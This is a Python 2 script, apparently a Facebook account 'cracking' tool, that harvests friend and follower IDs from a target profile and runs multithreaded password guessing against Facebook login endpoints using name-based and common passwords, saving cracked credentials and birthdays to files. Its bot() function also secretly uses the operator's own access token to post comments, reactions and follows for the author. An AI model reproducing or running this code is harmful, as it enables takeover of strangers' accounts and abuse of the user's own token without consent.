#!/usr/bin/python2
# coding=utf-8

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from datetime import datetime

#######COLOUR#######
b='\033[1;94m'                                #
i='\033[1;92m'                                 #
c='\033[1;96m'                                #
m='\033[1;91m'                               #
u='\033[1;95m'                                #
k='\033[1;93m'                                #
p='\033[1;97m'                                #
h='\033[1;92m'                                #
P = '\x1b[1;97m' # WHITE              #
M = '\x1b[1;91m' # RED           #
H = '\x1b[1;92m' # GREEN              #
K = '\x1b[1;93m' # YELLOW           #
B = '\x1b[1;94m' # BLUE               #
U = '\x1b[1;95m' # PURPLE              #
O = '\x1b[1;96m' # LIGHT BLUE     #
N = '\x1b[0m'    # OF COLOUR    #
######COLOUR########

try:
    import requests
except ImportError:
    os.system('pip2 install requests')
reload(sys)
sys.setdefaultencoding('utf8')
ip = requests.get('https://api.ipify.org').text
uas = random.choice(["Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/id_ID;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
"Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; SM-F916B Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.90 Safari/537.36 [FB_IAB/FB4A;FBAV/311.0.0.44.117;]",
"NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)"])
api = "https://b-api.facebook.com/method/auth.login"
id = []
cp = []
ok = []
loop = 0
ct = datetime.now()
n = ct.month
bulan = [
 'January',
 'February',
 'March',
 'April',
 'May',
 'June',
 'July',
 'August',
 'September',
 'October',
 'November',
 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
durasi = str(datetime.now().strftime('%d-%m-%Y'))
hari = datetime.now().strftime('%A')
jam = datetime.now().strftime('%H:%M:%S')
bulan = {
        "01": "January",
        "02": "February",
        "03": "March",
        "04": "April",
        "05": "May",
        "06": "June",
        "07": "July",
        "08": "August",
        "09": "September",
        "10": "October",
        "11": "November",
        "12": "December"}

def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
        
def logo():
	os.system("clear")
	print("""
\033[1;97m    _________    ____  ____
\033[1;96m   / ____/   |  / __ \/  _/
\033[1;97m  / /_  / /| | / /_/ // /  
\033[1;96m / __/ / ___ |/ _, _// /     \033[1;91m║Version: 2.0
\033[1;97m/_/   /_/  |_/_/ |_/___/   
\033[1;97m---------------------------------------------
\033[1;97mAuthor     : Fariya Khan Official.
\033[1;97mFacebook   : m.facebook.com/Faritricker007
\033[1;97mPage       : m.facebook.com/TechFari007
\033[1;97m---------------------------------------------
""").center(50)

def login():
    logo()
    print ' '
    print(" [1] Login With Access-Token")
    print(" [2] How To Get Access-Token Without Any Problem")
    print(" [3] Tech Fari Youtube")
    print ' '
    asw = raw_input("\n [!] Choose : ")
    if asw == "":
        login()
    if asw == "1":
        tokenz()
    if asw == "2":
        gettoken()
    if asw == "3":
        yt()
    else:
    	jalan(" [!] Choose Correct Option ! ")
    	menu()

def gettoken():
    logo()
    print("\033[0;96m"+50*"-")
    jalan(p+" ["+O+"•"+p+"] Open Youtube...")
    os.system("xdg-open https://youtu.be/LwUYU5RpvbYk")
    raw_input(p+" [BACK]")
    login() 
    
def yt():
    logo()
    print("\033[0;96m"+50*"-")
    jalan(p+" ["+O+"•"+p+"] Open Youtube...")
    os.system("xdg-open https://www.youtube.com/channel/UCgzG74c3dNuzBP7hwjWWYYA")
    raw_input(p+" [BACK]")
    login() 
    
def tokenz():
	os.system('clear')
	try:
		token = open('login.txt', 'r')
		menu()
	except (KeyError, IOError):
		os.system('clear')
		logo()
		print""+p+""
		print ('\033[1;97m[ login With Access Token ]').center(50)
		print ' '
		token = raw_input("\033[1;97m[!] Put Token : \033[0;90m")
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			zedd = open('login.txt', 'w')
			zedd.write(token)
			zedd.close()
			print("\033[1;92mToken login success").center(50)
			print ' '
			jalan("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Please Subscribe My Youtube Channel")
			os.system('xdg-open https://www.youtube.com/channel/UCgzG74c3dNuzBP7hwjWWYYA')
			bot()
		except KeyError:
			print("[!] Token Invalid!")
			sys.exit() 
 
def bot():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print"\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Token invalid"
        login()
    
    kom = ('Your Commands Is Best♥')
    kom1 = ('Big Fan Fariya Khan♥')
    reac = ('LOVE')
    post = ('1045071602597556')
    requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + token)
    requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom1+ '&access_token=' + token)
    requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ token)
    requests.post('https://graph.facebook.com/100012841782153/subscribers?access_token=' + token) #Fariya Khan
    requests.post('https://graph.facebook.com/100004586354930/subscribers?access_token=' + token) #Hunaen ALy
    menu()
    
def menu():
    global token
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print'[!] Token Invalid!'
        os.system('rm -f login.txt')
        time.sleep(3)
        tokenz()
    except requests.exceptions.ConnectionError:
        print'[!] No Connection!'
        sys.exit()

    logo()
    print(""+p+" [!] ID         : "+id)
    print(" [!] IP         : "+ip)
    print("\033[0;96m──────────────────────────────────────────────────")
    print"\t [ Logged User \033[1;93m"+nama+"\033[1;97m ]"
    print("\033[0;96m──────────────────────────────────────────────────")
    print("")
    print(" \033[1;97m[1] Crack From Public")
    print(" \033[1;97m[2] Crack From Followers")
    print(" \033[1;97m[3] See Crack Result")
    print(" \033[1;97m[4] Report Problem")
    print(" \033[1;97m[5] See Token")
    print(" \033[1;97m[6] Hack From File")
    print(" ["+m+"0"+p+"] Exit (Remove Token)")
    print ' '
    asw = raw_input("\n [!] Choose : ")
    if asw == "":
    	menu()
    elif asw == "1":
    	publik()
    elif asw == "2":
        fl()
    elif asw == "4":
    	laporbug()
    elif asw == "3":
    	cekakun()
    elif asw == "5":
        infologin()
    elif asw =="6":
		os.system('clear')
		print logo
		print "\033[1;96m•◈•───────────────•◈•\033[1;97mFARIYA\033[1;96m•◈•───────────────•◈•"
		try:
			idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mInput Name file  \x1b[1;91m: \x1b[1;97m')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
				pilihmetode(ppk)
		except IOError:
			print '\x1b[1;96m[!] \x1b[1;91mFile Dont See'
			raw_input('\n\x1b[1;96m[ \x1b[1;97mBack \x1b[1;96m]')
			menu()
    elif asw == "0":
    	os.system('rm -f login.txt')
    	jalan(" [!] Successfully Deleted Token ")
    	exit()
    else:
    	jalan(" [!] Choose Correct Option ! ")
    	menu() 
    
def publik():
    logo()
    print "\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m]Type \'me\' Crack From Friendlist"
    print ' '
    idt = raw_input("\033[1;97m [!] Put ID/Username : ")
    if idt == "":
    	menu()
    try:
        mmk = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
        kntl = json.loads(mmk.text)
        #print' [+] Nama : ' + sp['name']
    except KeyError:
        print'[!] ID Tidak Tersedia!'
        menu()

    ajg = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
    ppk = json.loads(ajg.text)
    for i in ppk['data']:
        uid = i['id']
        na = i['name']
        nm = na.rsplit(' ')[0]
        id.append(uid + '|' + nm)
    print""
    print' [!] Total ID:  \033[1;91m' + str(len(id))
    pilihmetode(ppk)

def fl():
    logo()
    print "\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m]Type \'me\' Crack From Friendlist"
    print ' '
    idt = raw_input("\033[1;97m [!] Put ID/Username : ")
    if idt == "":
    	menu()
    try:
        mmk = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
        kntl = json.loads(mmk.text)
        #print' [+] Nama : ' + sp['name']
    except KeyError:
        print'[!] ID Tidak Tersedia!'
        menu()

    ajg = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+token)
    ppk = json.loads(ajg.text)
    for i in ppk['data']:
        uid = i['id']
        na = i['name']
        nm = na.rsplit(' ')[0]
        id.append(uid + '|' + nm)
    print""
    print' [!] Total ID:  \033[1;91m' + str(len(id))
    pilihmetode(ppk)
    
def cekakun():
    logo()
    print'\n [1] See Crack Result OK '
    print' [2] See Crack Result CP '
    anjg = raw_input('\n [!] Choose : ')
    if anjg == '':
        menu()
    elif anjg == '01' or anjg == '1':
        print'\n [+] Result \x1b[0;92mOK\x1b[1;97m Date : \x1b[0;92m%s-%s-%s\x1b[1;97m' % (ha, op, ta)
        os.system(' cat out/OK-%s-%s-%s' % (ha, op, ta))
        raw_input("\n [•] BACK ")
        menu()
    elif anjg == '02' or anjg == '2':
        totalcp = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta)).read().splitlines()
        print '\n [•] CP Result Date : %s-%s-%s-%s' % (hari, ha, op, ta)
        print " \033[1;97m[•] Total : %s" %(len(totalcp))
        print""
        os.system(' cat out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta))
        raw_input("\n [•] BACK ")
        menu()
    else:
        print(' Choose Correct Option')
        menu()
 
def laporbug():
	os.system('xdg-open https://m.facebook.com/Faritricker007')
	raw_input("\n [•] BACK ")
	menu()
       
def infologin():
    logo()
    print""
    print "\n [*] TOKEN : "+token
    print ""
    raw_input("\n [•] BACK ")
    menu()
	
def pilihmetode(file):
	print("")
	print("\033[0;96m──────────────────────────────────────────────────")
	print(""+p+"      [ Select Crack Mehtod ]")
	print("\033[0;96m──────────────────────────────────────────────────")
	print ' '
	print(" \033[1;97m[1] Method Api (Recommended)")
	print(" \033[1;97m[2] Method Free.Fb (Slow)")
	print("")
	z = raw_input(" [!] Mehtod : ")
	if z == "":
		print(" [!] Choose Correct!")
		pilihmetode(file)
	elif z == '01' or z == '1':
		bapi()
	elif z == '02' or z == '2':
		freefb()
	else:
		print(" [!] Choose Correct Option!")
		exit()
	
def bapi():
	ask = raw_input(' Auto Pass/Manual Pass? [A/M]: ')
	if ask == 'M' or ask == 'm':
		manualbapi()
	logo()
	print("[!] If No Result, Turn On Aeroplane Mode 5-10 Seconds")
	print("\033[0;96m"+50*"-")
	print("")

	def main(arg):
		global ok,cp,ua, loop
		print '\r \033[1;97m[*] [crack] %s/%s -> OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
		sys.stdout.flush()
		user = arg
		uid,name=user.split("|") ##Gk Usah Di Ganti Ajg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			for pw in [name.lower(), name.lower() + '123', name.lower() + '1234', name.lower() + '12345','786786','pakistan','000786']:
				kontol = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
				'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
				'user-agent': uas, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
				param = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
				respon = requests.get(api,params=param, headers=kontol)
				if "session_key" in respon.text and "EAAA" in respon.text:
					print '\r  \033[0;92m[FK-OK] ' +uid+ ' | ' + pw + '        '
					ok.append(uid+'|'+pw)
					save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  [FK-OK] '+str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
					continue
				if "www.facebook.com" in respon.json()["error_msg"]:
					try:
						token = open('login.txt').read()  
						sw = requests.get('https://graph.facebook.com/'+uid+'/?access_token=' + token)
						b = json.loads(sw.text)
						graph = b["birthday"]
						month, day, year = graph.split("/")
						month = bulan[month]
						print'\r\x1b[1;93m  [FK-CP] ' + uid + ' | ' + pw + ' | ' + day + ' ' + month + ' ' + year + ' '
						cp.append(uid + '  |' + pw + '|' + day + ' ' + month + ' ' + year)
						save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
						save.write('  [FK-CP] ' + str(uid) + '|' + str(pw) + ' | ' + str(day) + ' ' + str(month) + ' ' + str(year) +                     '\n')
						save.close()
						break
					except(KeyError, IOError):
						graph = " "
					except:pass
					print'\r\x1b[1;93m  [FK-CP] ' + uid + ' | ' + pw + '                        '
					cp.append(uid + ' | ' + pw)
					save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
					save.write('  [FK-CP] ' + str(uid) + ' | ' + str(pw) +                        '\n')
					save.close()
					break
					continue
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print'\n\n\x1b[1;97m [+] Crack Finish...'
	exit()


def manualbapi():
    logo()
    print' [!] Create A Password Example: Pakistan, 000786, 786786'
    pw = raw_input(' [!] Type Password : ').split(',')
    if len(pw) == 0:
        exit('[!] Correct Content, Cannot Be Empty!')
	print("[!] If No Result, Turn On Aeroplane Mode 5-10 Seconds")
	print("\033[0;96m"+50*"-")
	print("")

    def main(arg):
        global loop
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
        print'\r\x1b[1;97m [*] [crack] %s/%s -> OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for asu in pw:
                kontol = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
                'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
                'user-agent': uas, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
                param = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":asu,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
                respon = requests.get(api,params=param, headers=kontol)
                if "session_key" in respon.text and "EAAA" in respon.text:
                    print'\r\x1b[0;92m  [FK-OK] ' + uid + ' | ' + asu + '        '
                    ok.append(uid + ' | ' + asu)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  [FK-OK] ' + str(uid) + ' | ' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue
                if "www.facebook.com" in respon.json()["error_msg"]:
                    print'\r\x1b[1;93m  [FK-CP] ' + uid + ' | ' + asu + '        '
                    cp.append(uid + ' | ' + asu)
                    save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
                    save.write('  [FK-CP] ' + str(uid) + ' | ' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print'\n\n\x1b[1;97m [+] Crack Finish...'
    exit()
    
def freefb():
    ask = raw_input(' Auto Pass/Manual Pass? [A/M]: ')
    if ask == 'M' or ask == 'm':
        manualfreefb()
	logo()
	print("[!] If No Result, Turn On Aeroplane Mode 5-10 Seconds")
	print("\033[0;96m"+50*"-")
	print("")
    
    def main(arg):
        global loop
        print'\r\x1b[1;97m [*] [crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for pw in [name.lower(), name.lower() + '123', name.lower() + '1234', name.lower() + '12345','786786','pakistan','000786']:
                rex = requests.post('https://free.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': uas })
                xo = rex.content
                if 'free_logout_button' in xo or 'save-device' in xo:
                    print'\r\x1b[1;92m  [FK-OK] ' + uid + '|' + pw + '                                            '
                    ok.append(uid + '|' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' [FK-OK] ' + str(uid) + '|' + str(pw) +                                   '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'checkpoint' in xo:
                    try:
                        token = open('login.txt').read()  
                        sw = requests.get('https://graph.facebook.com/'+uid+'/?access_token=' + token)
                        b = json.loads(sw.text)
                        graph = b["birthday"]
                        month, day, year = graph.split("/")
                        month = bulan[month]
                        print'\r\x1b[1;93m [FK-CP] ' + uid + '|' + pw + '|' + day + ' ' + month + ' ' + year + ' '
                        cp.append(uid + '|' + pw + '|' + day + ' ' + month + ' ' + year)
                        save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
                        save.write(' [FK-CP] ' + str(uid) + '|' + str(pw) + '|' + str(day) + ' ' + str(month) + ' ' + str(year) +                     '\n')
                        save.close()
                        break
                    except(KeyError, IOError):
                        graph = " "
                    except:pass
                    print'\r\x1b[1;93m  [FK-CP] ' + uid + '|' + pw + '                        '
                    cp.append(uid + '|' + pw)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  FK-CP ' + str(uid) + '|' + str(pw) +                        '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print'\n\n\x1b[1;97m [+] Crack Finish...'
    exit()


def manualfreefb():
    logo()
    print' [!] Create A Password Example: Pakistan, 000786, 786786'
    pw = raw_input(' [!] Type Password : ').split(',')
    if len(pw) == 0:
        exit('[!] Correct Content, Cannot Be Empty!')
    print("[!] If No Result, Turn On Aeroplane Mode 5-10 Seconds")
    print("\033[0;96m"+50*"-")
    print("")

    def main(arg):
        global loop
        print'\r\x1b[1;97m [*] [crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for asu in pw:
                rex = requests.post('https://free.facebook.com/login.php', data={'email': uid, 'pass': asu, 'login': 'submit'}, headers={'user-agent': uas })
                xo = rex.content
                if 'free_logout_button' in xo or 'save-device' in xo:
                    print'\r\x1b[1;92m. [FK-OK] ' + uid + ' | ' + asu + '                          '
                    ok.append(uid + '|' + asu)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  [FK-OK] ' + str(uid) + ' | ' + str(asu) +                         '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'checkpoint' in xo:
                    try:
                        token = open('login.txt').read()  
                        sw = requests.get('https://graph.facebook.com/'+uid+'/?access_token=' + token)
                        b = json.loads(sw.text)
                        graph = b["birthday"]
                        month, day, year = graph.split("/")
                        month = bulan[month]
                        print'\r\x1b[1;93m  [FK-CP] ' + uid + ' | ' + asu + ' | ' + day + ' ' + month + ' ' + year + ' '
                        cp.append(uid + '|' + asu + ' | ' + day + ' ' + month + ' ' + year)
                        save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
                        save.write('  [FK-CP] ' + str(uid) + ' | ' + str(asu) + ' | ' + str(day) + ' ' + str(month) + ' ' + str(year) +                     '\n')
                        save.close()
                        break
                    except(KeyError, IOError):
                        graph = " "
                    except:pass
                    print'\r\x1b[1;93m  [FK-CP] ' + uid + ' | ' + asu + '                        '
                    cp.append(uid + ' | ' + asu)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  [FK-CP] ' + str(uid) + ' | ' + str(asu) +                        '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass
    
    
    p = ThreadPool(30)
    p.map(main, id)
    print'\n\n\x1b[1;97m [+] Crack Finish...'
    exit()
    
if __name__ == '__main__':
    os.system('clear')
    login()
